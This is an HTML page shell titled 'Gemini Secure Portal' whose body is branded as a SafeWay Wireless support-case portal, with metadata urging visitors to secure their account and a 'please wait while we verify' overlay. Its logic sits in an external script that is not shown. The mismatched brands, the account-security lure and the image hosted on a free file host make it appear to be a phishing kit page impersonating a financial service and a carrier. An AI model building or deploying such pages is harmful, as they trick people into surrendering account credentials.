<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />

  <!-- Gemini Secure Portal Embed Metadata -->
  <meta property="og:title" content="Gemini Secure Portal" />
  <meta property="og:description" content="Access your secure portal to resolve a support ticket, or secure your account." />
  <meta property="og:image" content="https://i.ibb.co/WW8xXgF9/IMG-5863.png" />
  <meta property="og:type" content="website" />

  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="Gemini Secure Portal" />
  <meta name="twitter:description" content="Access your secure portal to resolve a support ticket, or secure your account." />
  <meta name="twitter:image" content="https://i.ibb.co/WW8xXgF9/IMG-5863.png" />

  <title>Gemini Secure Portal</title>

  <link rel="stylesheet" href="/help-portal/help-portal.css?v=20260802-wait2" />
</head>

<body>
  <div class="hp-shell">
    <header class="hp-top">
      <div class="hp-brand">SafeWay <span>Wireless</span> Support</div>
      <div class="hp-meta" id="hpTicketMeta">Loading case…</div>
    </header>

    <main class="hp-main">
      <div class="hp-card" id="hpCard">
        <h1>Loading…</h1>
        <p>Connecting to your support case.</p>
      </div>
    </main>

    <footer class="hp-foot">
      SafeWay Telecommunications · Care support portal · Do not share your ticket link publicly
    </footer>
  </div>

  <div class="hp-wait" id="hpWait" aria-hidden="true">
    <div class="hp-wait-inner">
      <div class="hp-spinner" role="status" aria-label="Loading"></div>
      <div class="hp-wait-text">Please wait while we verify this information.</div>
    </div>
  </div>

  <div class="hp-toasts" id="hpToasts" aria-live="polite"></div>

  <script src="/help-portal/help-portal.js?v=20260802-wait2"></script>
  <script>
    document.addEventListener("DOMContentLoaded", () => HP.bootCase());
  </script>
</body>
</html>
